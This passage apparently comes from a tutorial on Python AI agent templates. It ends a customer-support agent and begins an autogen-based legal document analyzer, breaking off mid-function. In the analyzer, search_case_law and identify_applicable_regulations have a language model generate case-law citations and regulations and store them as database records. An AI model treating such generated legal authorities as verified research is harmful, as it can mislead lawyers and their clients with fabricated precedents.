            closed_tickets_sample = [t for t in self.tickets.values() if t.get("status") == "closed"]
            # Limit to 20 tickets to avoid token limits
            closed_tickets_sample = closed_tickets_sample[:20] if len(closed_tickets_sample) > 20 else closed_tickets_sample
            
            tickets_summary = []
            for ticket in closed_tickets_sample:
                tickets_summary.append({
                    "inquiry": ticket.get("inquiry", ""),
                    "category": ticket.get("category", ""),
                    "resolution": ticket.get("resolution", ""),
                    "resolution_time": ticket.get("resolution_time", 0)
                })
            
            if tickets_summary:
                prompt = """Analyze these resolved support tickets and identify:
                1. Common issues that customers are experiencing
                2. Knowledge gaps where we might need more documentation
                3. Most effective responses that led to positive outcomes

                Return a JSON object with common_issues (array), knowledge_gaps (array), and top_performing_responses (array).
                """
                
                response = client.chat.completions.create(
                    model="gpt-4-turbo",
                    messages=[
                        {"role": "system", "content": "You are a customer support analytics specialist who identifies patterns and insights from support data."},
                        {"role": "user", "content": prompt + "\n\nTickets: " + json.dumps(tickets_summary)}
                    ],
                    temperature=0.3,
                    response_format={"type": "json_object"}
                )
                
                analysis = json.loads(response.choices[0].message.content)
                
                if "common_issues" in analysis:
                    insights["common_issues"] = analysis["common_issues"]
                if "knowledge_gaps" in analysis:
                    insights["knowledge_gaps"] = analysis["knowledge_gaps"]
                if "top_performing_responses" in analysis:
                    insights["top_performing_responses"] = analysis["top_performing_responses"]
        
        except Exception as e:
            logger.error(f"Error generating support insights: {e}")
        
        return insights

# Example usage
if __name__ == "__main__":
    # Initialize the agent with a sample knowledge base
    support_agent = CustomerSupportAgent()
    
    # Add some entries to the knowledge base
    support_agent.update_knowledge_base_entry(
        category="products",
        key="premium_subscription",
        content="""
        Premium Subscription includes:
        - Unlimited access to all features
        - Priority customer support
        - Advanced analytics
        - Team collaboration tools
        - Custom integrations
        
        Price: $49.99/month or $499.90/year (save 2 months)
        """
    )
    
    support_agent.update_knowledge_base_entry(
        category="troubleshooting",
        key="login_issues",
        content="""
        Common login issues and solutions:
        
        1. Forgotten password: Use the "Forgot Password" link on the login page to reset your password via email.
        
        2. Account locked: After 5 failed login attempts, accounts are temporarily locked for 30 minutes. Contact support if you need immediate access.
        
        3. Email verification needed: New accounts require email verification. Check your inbox and spam folder for the verification email.
        
        4. Browser issues: Try clearing your browser cache and cookies, or use a different browser.
        
        5. VPN interference: Some corporate VPNs may block access. Try connecting without VPN or contact your IT department.
        """
    )
    
    support_agent.update_knowledge_base_entry(
        category="faqs",
        key="cancellation_policy",
        content="""
        Cancellation Policy:
        
        - You can cancel your subscription at any time from your account settings.
        - For monthly subscriptions, cancellation takes effect at the end of the current billing period.
        - For annual subscriptions, you may request a prorated refund within 30 days of payment.
        - No refunds are provided for monthly subscriptions.
        - Data is retained for 30 days after cancellation before being permanently deleted.
        """
    )
    
    # Sample customer conversation
    customer_message = "I'm having trouble logging in to my account. I've tried resetting my password but I'm not receiving the reset email."
    
    # Process the message
    response = support_agent.handle_customer_message(
        message=customer_message,
        customer_id="CUST12345"
    )
    
    print("Customer:", customer_message)
    print("\nAgent:", response["response"])
    print("\nSentiment:", response["sentiment"])
    print("Ticket ID:", response["ticket_id"])
    
    # Follow-up message
    follow_up = "I checked my spam folder and still don't see it. I'm using gmail."
    
    follow_up_response = support_agent.handle_customer_message(
        message=follow_up,
        customer_id="CUST12345",
        conversation_id=response["conversation_id"]
    )
    
    print("\nCustomer:", follow_up)
    print("\nAgent:", follow_up_response["response"])
```

**Usage Example:**

```python
from customer_support_agent import CustomerSupportAgent

# Initialize agent
agent = CustomerSupportAgent()

# Add knowledge base entries
agent.update_knowledge_base_entry(
    category="products",
    key="starter_plan",
    content="""
    Starter Plan Details:
    - 5 users included
    - 100GB storage
    - Email support only
    - Basic analytics
    - $9.99/month or $99/year
    """
)

agent.update_knowledge_base_entry(
    category="troubleshooting",
    key="mobile_sync_issues",
    content="""
    Mobile Sync Troubleshooting:
    1. Ensure you're using the latest app version
    2. Check your internet connection
    3. Try logging out and back in
    4. Verify background data usage is enabled
    5. Clear app cache in your device settings
    
    If problems persist, please provide:
    - Device model
    - OS version
    - App version
    - Specific error message
    """
)

# Start conversation
conversation_id = None
customer_id = "customer_789"

# Initial inquiry
inquiry = "Hi, the mobile app isn't syncing my latest changes. I'm on an iPhone 13."

response = agent.handle_customer_message(
    message=inquiry,
    customer_id=customer_id
)

conversation_id = response["conversation_id"]
print(f"AGENT ({response['agent']}): {response['response']}")

# Follow-up message
follow_up = "I've tried updating and restarting, but it's still not working. I'm getting an error that says 'Sync failed: Error code 403'"

follow_up_response = agent.handle_customer_message(
    message=follow_up,
    customer_id=customer_id,
    conversation_id=conversation_id
)

print(f"AGENT ({follow_up_response['agent']}): {follow_up_response['response']}")

# Resolution message
resolution = "That worked! I can see my changes now. Thanks for your help."

resolution_response = agent.handle_customer_message(
    message=resolution,
    customer_id=customer_id,
    conversation_id=conversation_id
)

print(f"AGENT ({resolution_response['agent']}): {resolution_response['response']}")

# Get customer sentiment trend
sentiment_trend = agent.get_customer_sentiment_trend(customer_id)
print("\nCUSTOMER SENTIMENT ANALYSIS:")
print(f"Average sentiment: {sentiment_trend['average_sentiment']:.2f}")
print(f"Emotion distribution: {sentiment_trend['emotion_distribution']}")

# Generate support insights
insights = agent.generate_support_insights()
print("\nSUPPORT INSIGHTS:")
print(f"Total tickets: {insights['tickets']['total']}")
print(f"Open tickets: {insights['tickets']['open']}")
print(f"Average resolution time: {insights['tickets']['avg_resolution_time']:.2f} seconds")
if insights['common_issues']:
    print("\nCommon issues identified:")
    for issue in insights['common_issues']:
        print(f"- {issue}")
```

This AI Customer Support agent template demonstrates key enterprise patterns:

1. **Specialized Agents**: Different agents handle specific aspects of customer support (technical, billing, etc.)
2. **Sentiment Analysis**: Tracks customer emotions to identify satisfaction issues
3. **Knowledge Management**: Dynamically improves knowledge base from successful resolutions
4. **Ticket System Integration**: Creates and updates support tickets based on conversations
5. **Continuous Learning**: Extracts insights to identify common issues and knowledge gaps

### AI-Powered Legal Document Analyzer (Case Law Research & Compliance)

This AI agent template is designed to analyze legal documents, extract key information, identify relevant precedents, and assess compliance requirements. It provides legal professionals with comprehensive document analysis and research capabilities.

**Core Capabilities:**
- Legal document parsing and clause extraction
- Case law research and precedent identification
- Compliance requirement analysis
- Risk assessment and issue spotting
- Legal summary and recommendation generation
- Citation verification and validation

**Architecture:**

![Legal Document Analyzer Architecture](https://i.imgur.com/3w8Llup.png)

**Implementation Example:**

```python
# legal_document_analyzer.py
import os
import json
import datetime
import uuid
import re
import pandas as pd
import numpy as np
import autogen
import openai
from typing import Dict, List, Any, Optional, Union, Tuple

# Configure API keys and settings
OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "your-api-key")

# Initialize OpenAI client
client = openai.OpenAI(api_key=OPENAI_API_KEY)

class LegalDocumentAnalyzer:
    """
    An AI-powered legal document analyzer that extracts information, identifies
    precedents, and assesses compliance requirements.
    """
    
    def __init__(self, config=None):
        """
        Initialize the Legal Document Analyzer.
        
        Args:
            config: Optional configuration dictionary
        """
        self.config = config or {}
        
        # Case law database file path
        self.case_law_db_path = self.config.get("case_law_db_path", "case_law_database.json")
        
        # Load case law database if it exists, otherwise create an empty one
        self.case_law_db = self._load_case_law_db()
        
        # Compliance requirements database file path
        self.compliance_db_path = self.config.get("compliance_db_path", "compliance_database.json")
        
        # Load compliance database if it exists, otherwise create an empty one
        self.compliance_db = self._load_compliance_db()
        
        # Document analysis history
        self.analysis_history = {}
        
        # Load analysis history if available
        self.history_path = self.config.get("history_path", "analysis_history.json")
        if os.path.exists(self.history_path):
            try:
                with open(self.history_path, 'r') as f:
                    self.analysis_history = json.load(f)
            except Exception as e:
                print(f"Error loading analysis history: {e}")
        
        # Set up agent configuration
        self.llm_config = {
            "config_list": [{"model": "gpt-4-turbo", "api_key": OPENAI_API_KEY}],
            "temperature": 0.2,
            "timeout": 180
        }
        
        # Create the agent team
        self._create_agent_team()
    
    def _load_case_law_db(self) -> Dict:
        """
        Load the case law database from a JSON file.
        
        Returns:
            Dictionary containing the case law database
        """
        if os.path.exists(self.case_law_db_path):
            try:
                with open(self.case_law_db_path, 'r') as f:
                    return json.load(f)
            except Exception as e:
                print(f"Error loading case law database: {e}")
        
        # If file doesn't exist or has errors, initialize with empty structure
        return {
            "cases": {},
            "jurisdictions": {},
            "areas_of_law": {},
            "citations": {}
        }
    
    def _load_compliance_db(self) -> Dict:
        """
        Load the compliance requirements database from a JSON file.
        
        Returns:
            Dictionary containing the compliance database
        """
        if os.path.exists(self.compliance_db_path):
            try:
                with open(self.compliance_db_path, 'r') as f:
                    return json.load(f)
            except Exception as e:
                print(f"Error loading compliance database: {e}")
        
        # If file doesn't exist or has errors, initialize with empty structure
        return {
            "regulations": {},
            "jurisdictions": {},
            "industries": {},
            "requirements": {}
        }
    
    def save_case_law_db(self):
        """Save the case law database to a JSON file."""
        try:
            with open(self.case_law_db_path, 'w') as f:
                json.dump(self.case_law_db, f, indent=2)
            print("Case law database saved successfully")
        except Exception as e:
            print(f"Error saving case law database: {e}")
    
    def save_compliance_db(self):
        """Save the compliance database to a JSON file."""
        try:
            with open(self.compliance_db_path, 'w') as f:
                json.dump(self.compliance_db, f, indent=2)
            print("Compliance database saved successfully")
        except Exception as e:
            print(f"Error saving compliance database: {e}")
    
    def _create_agent_team(self):
        """Create the team of specialized agents for legal document analysis."""
        
        # 1. Document Parser - Specialized in extracting structured information from legal documents
        self.document_parser = autogen.AssistantAgent(
            name="DocumentParser",
            system_message="""You are an expert legal document parser who specializes in extracting structured
            information from legal documents of all types.
            
            Your responsibilities:
            1. Extract key information from legal documents (contracts, legislation, case law, etc.)
            2. Identify and categorize legal clauses and provisions
            3. Recognize parties, dates, obligations, and other critical elements
            4. Identify the document type and purpose
            5. Detect jurisdiction and governing law
            
            Be thorough, precise, and comprehensive in your extraction. Focus on identifying the complete
            structure of the document including sections, clauses, and subclauses. Recognize legal terminology
            accurately. Maintain the hierarchical relationships between different parts of the document.
            Extract all relevant metadata such as dates, parties, jurisdictions, and subject matter.""",
            llm_config=self.llm_config
        )
        
        # 2. Legal Researcher - Specialized in case law and precedent research
        self.legal_researcher = autogen.AssistantAgent(
            name="LegalResearcher",
            system_message="""You are an expert legal researcher who specializes in finding relevant
            case law, statutes, regulations, and legal precedents.
            
            Your responsibilities:
            1. Identify relevant legal authorities based on document content
            2. Find and analyze case law precedents that may impact interpretation
            3. Research statutes and regulations applicable to the document
            4. Examine how courts have interpreted similar language or provisions
            5. Identify potential conflicts between the document and existing law
            
            Be thorough, precise, and focused on finding the most relevant legal authorities. Consider
            different jurisdictions when appropriate. Provide accurate citations for all legal authorities.
            Analyze how courts have interpreted similar provisions. Consider both supporting and contradicting
            precedents. Evaluate the strength and applicability of different legal authorities.""",
            llm_config=self.llm_config
        )
        
        # 3. Compliance Analyst - Specialized in compliance requirements
        self.compliance_analyst = autogen.AssistantAgent(
            name="ComplianceAnalyst",
            system_message="""You are an expert compliance analyst who specializes in identifying
            regulatory requirements and assessing documents for compliance issues.
            
            Your responsibilities:
            1. Identify applicable regulations and compliance requirements
            2. Assess whether the document meets regulatory standards
            3. Flag potential compliance issues or violations
            4. Recommend changes to address compliance concerns
            5. Analyze industry-specific regulatory considerations
            
            Be thorough, detail-oriented, and comprehensive in your compliance analysis. Consider
            multiple jurisdictions and regulatory frameworks. Identify both explicit compliance issues
            and potential gray areas. Provide specific references to relevant regulations. Consider
            industry-specific compliance requirements. Evaluate both the letter and spirit of regulations.""",
            llm_config=self.llm_config
        )
        
        # 4. Issue Spotter - Specialized in identifying legal risks and issues
        self.issue_spotter = autogen.AssistantAgent(
            name="IssueSpotter",
            system_message="""You are an expert legal issue spotter who specializes in identifying
            potential legal risks, ambiguities, and problematic provisions in legal documents.
            
            Your responsibilities:
            1. Identify ambiguous language or provisions that could lead to disputes
            2. Spot potential legal risks or liabilities
            3. Detect missing provisions or protections
            4. Analyze enforceability concerns
            5. Identify conflicts between different parts of the document
            
            Be thorough, critical, and anticipate potential problems. Look for ambiguities in language
            that could be interpreted in multiple ways. Identify provisions that may be unenforceable.
            Consider practical implementation challenges. Look for missing provisions that should be
            included. Identify protections that would benefit each party. Consider worst-case scenarios
            and how the document would apply.""",
            llm_config=self.llm_config
        )
        
        # 5. Legal Summarizer - Specialized in creating comprehensive legal summaries
        self.legal_summarizer = autogen.AssistantAgent(
            name="LegalSummarizer",
            system_message="""You are an expert legal summarizer who specializes in creating clear,
            comprehensive summaries of complex legal documents and analyses.
            
            Your responsibilities:
            1. Synthesize key information from legal documents into clear summaries
            2. Highlight the most important provisions, risks, and considerations
            3. Organize information logically and hierarchically
            4. Translate complex legal concepts into accessible language
            5. Create executive summaries for non-legal audiences when needed
            
            Be comprehensive while focusing on what matters most. Structure your summaries logically
            with clear sections and headings. Use precise language while avoiding unnecessary legal
            jargon. Distinguish between major and minor points. Include all critical information while
            being concise. Create different levels of detail appropriate for different audiences.""",
            llm_config=self.llm_config
        )
        
        # User proxy agent for orchestrating the workflow
        self.user_proxy = autogen.UserProxyAgent(
            name="LegalAnalysisCoordinator",
            human_input_mode="NEVER",
            code_execution_config=False,
            system_message="""You are a coordinator for legal document analysis.
            Your role is to manage the flow of information between the specialized legal agents.
            You help distribute document content to the right specialists and compile their insights."""
        )
    
    def extract_document_structure(self, document_text: str) -> Dict[str, Any]:
        """
        Extract structured information from a legal document.
        
        Args:
            document_text: Text content of the legal document
            
        Returns:
            Dictionary with structured document information
        """
        try:
            # Use OpenAI to extract document structure
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal document structure extraction specialist. Extract the hierarchical structure and key metadata from legal documents."},
                    {"role": "user", "content": f"Extract the structure and metadata from this legal document. Return a JSON object with document_type, jurisdiction, date, parties, governing_law, and hierarchical structure (sections, clauses, sub-clauses). For each structural element, include the heading/number and a brief description of the content.\n\nDocument text:\n\n{document_text[:15000]}"}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            structure = json.loads(response.choices[0].message.content)
            
            return structure
            
        except Exception as e:
            print(f"Error extracting document structure: {e}")
            return {
                "document_type": "Unknown",
                "error": str(e),
                "partial_text": document_text[:100] + "..."
            }
    
    def extract_legal_entities(self, document_text: str) -> Dict[str, List[Dict[str, Any]]]:
        """
        Extract legal entities from document text.
        
        Args:
            document_text: Text content of the legal document
            
        Returns:
            Dictionary with extracted entities by category
        """
        try:
            # Use OpenAI to extract legal entities
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal entity extraction specialist who identifies parties, jurisdictions, legal references, dates, and key terms in legal documents."},
                    {"role": "user", "content": f"Extract all legal entities from this document. Return a JSON object with these categories: parties (individuals and organizations), jurisdictions, legal_references (statutes, cases, regulations), dates (with context), monetary_values, and defined_terms.\n\nFor each entity, include the entity text, category, context (surrounding text), and a confidence score (0-1).\n\nDocument text:\n\n{document_text[:15000]}"}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            entities = json.loads(response.choices[0].message.content)
            
            return entities
            
        except Exception as e:
            print(f"Error extracting legal entities: {e}")
            return {
                "parties": [],
                "jurisdictions": [],
                "legal_references": [],
                "dates": [],
                "monetary_values": [],
                "defined_terms": [],
                "error": str(e)
            }
    
    def identify_obligations_and_rights(self, document_text: str) -> Dict[str, List[Dict[str, Any]]]:
        """
        Identify obligations, rights, and permissions in the document.
        
        Args:
            document_text: Text content of the legal document
            
        Returns:
            Dictionary with obligations, rights, permissions, and prohibitions
        """
        try:
            # Use OpenAI to identify obligations and rights
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal rights and obligations specialist who identifies commitments, permissions, prohibitions, and conditions in legal documents."},
                    {"role": "user", "content": f"Identify all obligations, rights, permissions, and prohibitions in this legal document. Return a JSON object with these categories: obligations (must do), rights (entitled to), permissions (may do), and prohibitions (must not do).\n\nFor each item, include the text, the subject (who it applies to), the object (what it applies to), any conditions, and the location in the document.\n\nDocument text:\n\n{document_text[:15000]}"}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            rights_obligations = json.loads(response.choices[0].message.content)
            
            return rights_obligations
            
        except Exception as e:
            print(f"Error identifying obligations and rights: {e}")
            return {
                "obligations": [],
                "rights": [],
                "permissions": [],
                "prohibitions": [],
                "error": str(e)
            }
    
    def search_case_law(self, query: str, jurisdiction: str = None, limit: int = 5) -> List[Dict[str, Any]]:
        """
        Search for relevant case law based on query.
        
        Args:
            query: Search query
            jurisdiction: Optional jurisdiction filter
            limit: Maximum number of results
            
        Returns:
            List of relevant case law entries
        """
        results = []
        
        # If we have a small or empty database, use OpenAI to generate relevant case law
        if len(self.case_law_db.get("cases", {})) < 10:
            try:
                # Generate relevant case law using OpenAI
                response = client.chat.completions.create(
                    model="gpt-4-turbo",
                    messages=[
                        {"role": "system", "content": "You are a legal research specialist with expertise in case law across multiple jurisdictions."},
                        {"role": "user", "content": f"Find {limit} relevant case law precedents for this legal question or issue. If a specific jurisdiction is mentioned, prioritize cases from that jurisdiction.\n\nQuery: {query}\nJurisdiction: {jurisdiction if jurisdiction else 'Any'}\n\nFor each case, provide the case name, citation, jurisdiction, year, key holdings, and relevance to the query. Return as a JSON array."}
                    ],
                    temperature=0.2,
                    response_format={"type": "json_object"}
                )
                
                # Parse the response
                case_law = json.loads(response.choices[0].message.content)
                
                # If the response is wrapped in a container object, extract the cases array
                if "cases" in case_law:
                    case_law = case_law["cases"]
                
                # Add generated cases to the database
                for case in case_law:
                    case_id = str(uuid.uuid4())
                    self.case_law_db["cases"][case_id] = case
                    
                    # Add to jurisdictions index
                    case_jurisdiction = case.get("jurisdiction", "Unknown")
                    if case_jurisdiction not in self.case_law_db["jurisdictions"]:
                        self.case_law_db["jurisdictions"][case_jurisdiction] = []
                    self.case_law_db["jurisdictions"][case_jurisdiction].append(case_id)
                    
                    # Add to areas of law index
                    areas = case.get("areas_of_law", [])
                    if isinstance(areas, str):
                        areas = [areas]
                    
                    for area in areas:
                        if area not in self.case_law_db["areas_of_law"]:
                            self.case_law_db["areas_of_law"][area] = []
                        self.case_law_db["areas_of_law"][area].append(case_id)
                    
                    # Add to citations index
                    citation = case.get("citation", "")
                    if citation:
                        self.case_law_db["citations"][citation] = case_id
                
                # Save the updated database
                self.save_case_law_db()
                
                return case_law
                
            except Exception as e:
                print(f"Error generating case law: {e}")
                return []
        
        # Search the existing database
        # This is a simplified search - in a real application, this would use vector embeddings
        # and more sophisticated matching
        
        # First, search by jurisdiction if specified
        jurisdiction_cases = []
        if jurisdiction and jurisdiction in self.case_law_db.get("jurisdictions", {}):
            jurisdiction_case_ids = self.case_law_db["jurisdictions"][jurisdiction]
            jurisdiction_cases = [self.case_law_db["cases"][case_id] for case_id in jurisdiction_case_ids if case_id in self.case_law_db["cases"]]
        
        # If no jurisdiction specified or no cases found, use all cases
        search_cases = jurisdiction_cases if jurisdiction_cases else list(self.case_law_db["cases"].values())
        
        # Convert query to lowercase for case-insensitive matching
        query_lower = query.lower()
        
        # Filter cases by relevance to query
        for case in search_cases:
            # Check if query terms appear in case name, holdings, or summary
            case_text = (
                case.get("case_name", "").lower() + " " +
                case.get("key_holdings", "").lower() + " " +
                case.get("summary", "").lower()
            )
            
            if query_lower in case_text:
                # Calculate a simple relevance score based on term frequency
                relevance = case_text.count(query_lower) / len(case_text.split())
                
                results.append({
                    **case,
                    "relevance_score": relevance
                })
        
        # Sort by relevance and limit results
        results.sort(key=lambda x: x.get("relevance_score", 0), reverse=True)
        return results[:limit]
    
    def identify_applicable_regulations(self, document_text: str, jurisdiction: str = None, industry: str = None) -> List[Dict[str, Any]]:
        """
        Identify regulations that may apply to the document.
        
        Args:
            document_text: Text content of the legal document
            jurisdiction: Optional jurisdiction filter
            industry: Optional industry filter
            
        Returns:
            List of applicable regulations with compliance considerations
        """
        # If we have a small or empty database, use OpenAI to generate applicable regulations
        if len(self.compliance_db.get("regulations", {})) < 10:
            try:
                # Extract document type and key elements first
                doc_structure = self.extract_document_structure(document_text)
                doc_type = doc_structure.get("document_type", "Unknown")
                doc_jurisdiction = doc_structure.get("jurisdiction", jurisdiction)
                
                # Generate applicable regulations using OpenAI
                prompt = f"""Identify regulations that apply to this {doc_type} document"""
                if doc_jurisdiction:
                    prompt += f" in {doc_jurisdiction}"
                if industry:
                    prompt += f" for the {industry} industry"
                
                prompt += f""". The document contains the following key elements:
                
                Document Type: {doc_type}
                Jurisdiction: {doc_jurisdiction if doc_jurisdiction else 'Unknown'}
                Industry: {industry if industry else 'Unknown'}
                
                For each regulation, provide:
                1. The full name and common abbreviation
                2. Jurisdiction
                3. Key compliance requirements relevant to this document
                4. Specific sections of the regulation that apply
                5. Risk level for non-compliance (High, Medium, Low)
                
                Return as a JSON array of regulations.
                
                Document excerpt:
                {document_text[:2000]}...
                """
                
                response = client.chat.completions.create(
                    model="gpt-4-turbo",
                    messages=[
                        {"role": "system", "content": "You are a legal compliance specialist with expertise in regulatory requirements across multiple jurisdictions and industries."},
                        {"role": "user", "content": prompt}
                    ],
                    temperature=0.2,
                    response_format={"type": "json_object"}
                )
                
                # Parse the response
                regulations = json.loads(response.choices[0].message.content)
                
                # If the response is wrapped in a container object, extract the regulations array
                if "regulations" in regulations:
                    regulations = regulations["regulations"]
                
                # Add generated regulations to the database
                for regulation in regulations:
                    regulation_id = str(uuid.uuid4())
                    self.compliance_db["regulations"][regulation_id] = regulation
                    
                    # Add to jurisdictions index
                    reg_jurisdiction = regulation.get("jurisdiction", "Unknown")
                    if reg_jurisdiction not in self.compliance_db["jurisdictions"]:
                        self.compliance_db["jurisdictions"][reg_jurisdiction] = []
                    self.compliance_db["jurisdictions"][reg_jurisdiction].append(regulation_id)
                    
                    # Add to industries index if applicable
                    if industry:
                        if industry not in self.compliance_db["industries"]:
                            self.compliance_db["industries"][industry] = []
                        self.compliance_db["industries"][industry].append(regulation_id)
                
                # Save the updated database
                self.save_compliance_db()
                
                return regulations
                
            except Exception as e:
                print(f"Error identifying applicable regulations: {e}")
                return []
        
        # Search the existing database
        # This is a simplified search - in a real application, this would use more sophisticated matching
        
        # Filter by jurisdiction if specified
        jurisdiction_regulations = []
        if jurisdiction and jurisdiction in self.compliance_db.get("jurisdictions", {}):
            jurisdiction_reg_ids = self.compliance_db["jurisdictions"][jurisdiction]
            jurisdiction_regulations = [self.compliance_db["regulations"][reg_id] for reg_id in jurisdiction_reg_ids if reg_id in self.compliance_db["regulations"]]
        
        # Filter by industry if specified
        industry_regulations = []
        if industry and industry in self.compliance_db.get("industries", {}):
            industry_reg_ids = self.compliance_db["industries"][industry]
            industry_regulations = [self.compliance_db["regulations"][reg_id] for reg_id in industry_reg_ids if reg_id in self.compliance_db["regulations"]]
        
        # If both filters specified, find intersection
        if jurisdiction and industry:
            results = [reg for reg in jurisdiction_regulations if reg in industry_regulations]
        elif jurisdiction:
            results = jurisdiction_regulations
        elif industry:
            results = industry_regulations
        else:
            # If no filters, return all regulations
            results = list(self.compliance_db["regulations"].values())
        
        # Sort by relevance (this would be more sophisticated in a real application)
        results.sort(key=lambda x: x.get("risk_level", "Medium") == "High", reverse=True)
        
        return results
    
    def assess_compliance(self, document_text: str, regulations: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Assess document compliance with specified regulations.
        
        Args:
            document_text: Text content of the legal document
            regulations: List of regulations to assess against
            
        Returns:
            Compliance assessment with issues and recommendations
        """
        try:
            # Prepare regulations for the prompt
            regulations_text = json.dumps(regulations, indent=2)
            
            # Use OpenAI to assess compliance
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal compliance specialist who assesses documents for regulatory compliance issues."},
                    {"role": "user", "content": f"Assess this legal document for compliance with the specified regulations. Identify compliance issues, their severity, and provide specific recommendations for addressing each issue.\n\nRegulations to assess against:\n{regulations_text}\n\nDocument text:\n{document_text[:10000]}"}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            assessment = json.loads(response.choices[0].message.content)
            
            return assessment
            
        except Exception as e:
            print(f"Error assessing compliance: {e}")
            return {
                "compliance_score": 0,
                "issues": [],
                "recommendations": [],
                "error": str(e)
            }
    
    def identify_legal_issues(self, document_text: str, document_type: str = None) -> Dict[str, Any]:
        """
        Identify potential legal issues and risks in the document.
        
        Args:
            document_text: Text content of the legal document
            document_type: Optional document type for context
            
        Returns:
            Dictionary with identified issues, risks, and recommendations
        """
        try:
            # Use OpenAI to identify legal issues
            prompt = "Identify potential legal issues, risks, and ambiguities in this document."
            if document_type:
                prompt += f" This is a {document_type} document."
            
            prompt += f"\n\nFor each issue, provide:\n1. Issue description\n2. Severity (High, Medium, Low)\n3. Location in the document\n4. Potential consequences\n5. Recommended remediation\n\nDocument text:\n{document_text[:10000]}"
            
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal risk assessment specialist who identifies potential issues, ambiguities, and risks in legal documents."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            issues = json.loads(response.choices[0].message.content)
            
            return issues
            
        except Exception as e:
            print(f"Error identifying legal issues: {e}")
            return {
                "issues": [],
                "overall_risk_level": "Unknown",
                "error": str(e)
            }
    
    def generate_document_summary(self, document_text: str, analysis_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate a comprehensive summary of the document and analysis.
        
        Args:
            document_text: Text content of the legal document
            analysis_results: Results from previous analysis steps
            
        Returns:
            Dictionary with executive summary and detailed summary
        """
        try:
            # Prepare analysis results for the prompt
            analysis_text = json.dumps(analysis_results, indent=2)
            
            # Use OpenAI to generate summary
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal document summarization specialist who creates clear, comprehensive summaries of legal documents and their analysis."},
                    {"role": "user", "content": f"Create a comprehensive summary of this legal document based on the document text and analysis results. Include both an executive summary (brief overview for non-legal audience) and a detailed summary (comprehensive analysis for legal professionals).\n\nAnalysis results:\n{analysis_text}\n\nDocument text:\n{document_text[:5000]}"}
                ],
                temperature=0.3,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            summary = json.loads(response.choices[0].message.content)
            
            return summary
            
        except Exception as e:
            print(f"Error generating document summary: {e}")
            return {
                "executive_summary": "Error generating summary",
                "detailed_summary": f"Error: {str(e)}",
                "error": str(e)
            }
    
    def verify_citations(self, document_text: str) -> Dict[str, Any]:
        """
        Verify legal citations in the document.
        
        Args:
            document_text: Text content of the legal document
            
        Returns:
            Dictionary with verification results for each citation
        """
        try:
            # Use OpenAI to extract and verify citations
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal citation specialist who extracts and verifies legal citations in documents."},
                    {"role": "user", "content": f"Extract and verify all legal citations in this document. For each citation, identify:\n1. The citation text\n2. Citation type (case, statute, regulation, etc.)\n3. Whether the citation appears to be valid, formatted correctly, and used in the proper context\n4. Any issues or corrections needed\n\nReturn as a JSON object with an array of citations.\n\nDocument text:\n{document_text[:15000]}"}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            citations = json.loads(response.choices[0].message.content)
            
            return citations
            
        except Exception as e:
            print(f"Error verifying citations: {e}")
            return {
                "citations": [],
                "error": str(e)
            }
    
    def analyze_document(self, document_text: str, document_type: str = None, jurisdiction: str = None, industry: str = None) -> Dict[str, Any]:
        """
        Perform comprehensive analysis of a legal document.
        
        Args:
            document_text: Text content of the legal document
            document_type: Optional document type
            jurisdiction: Optional jurisdiction
            industry: Optional industry context
            
        Returns:
            Dictionary with comprehensive document analysis
        """
        # Generate a unique analysis ID
        analysis_id = f"ANALYSIS-{uuid.uuid4().hex[:8]}"
        
        # Create group chat for agent collaboration
        groupchat = autogen.GroupChat(
            agents=[
                self.user_proxy, 
                self.document_parser, 
                self.legal_researcher, 
                self.compliance_analyst,
                self.issue_spotter,
                self.legal_summarizer
            ],
            messages=[],
            max_round=15
        )
        
        manager = autogen.GroupChatManager(groupchat=groupchat)
        
        # Step 1: Extract document structure
        structure = self.extract_document_structure(document_text)
        
        # If document_type wasn't provided, use the one from structure analysis
        if not document_type and "document_type" in structure:
            document_type = structure.get("document_type")
        
        # If jurisdiction wasn't provided, use the one from structure analysis
        if not jurisdiction and "jurisdiction" in structure:
            jurisdiction = structure.get("jurisdiction")
        
        # Step 2: Extract legal entities
        entities = self.extract_legal_entities(document_text)
        
        # Step 3: Identify obligations and rights
        rights_obligations = self.identify_obligations_and_rights(document_text)
        
        # Step 4: Search for relevant case law
        # Create a search query based on document type and key entities
        search_query = f"{document_type if document_type else 'legal document'}"
        if jurisdiction:
            search_query += f" {jurisdiction}"
        if "key_topics" in structure:
            topics = structure.get("key_topics", [])
            if isinstance(topics, list) and topics:
                search_query += f" {' '.join(topics[:3])}"
        
        case_law = self.search_case_law(search_query, jurisdiction=jurisdiction)
        
        # Step 5: Identify applicable regulations
        regulations = self.identify_applicable_regulations(document_text, jurisdiction=jurisdiction, industry=industry)
        
        # Step 6: Assess compliance
        compliance = self.assess_compliance(document_text, regulations)
        
        # Step 7: Identify legal issues and risks
        issues = self.identify_legal_issues(document_text, document_type=document_type)
        
        # Prepare analysis data for the agents
        document_excerpt = document_text[:3000] + ("..." if len(document_text) > 3000 else "")
        
        analysis_data = {
            "document_structure": structure,
            "entities": entities,
            "rights_obligations": rights_obligations,
            "case_law": case_law,
            "regulations": regulations,
            "compliance": compliance,
            "issues": issues
        }
        
        # Convert analysis data to a readable format for the prompt
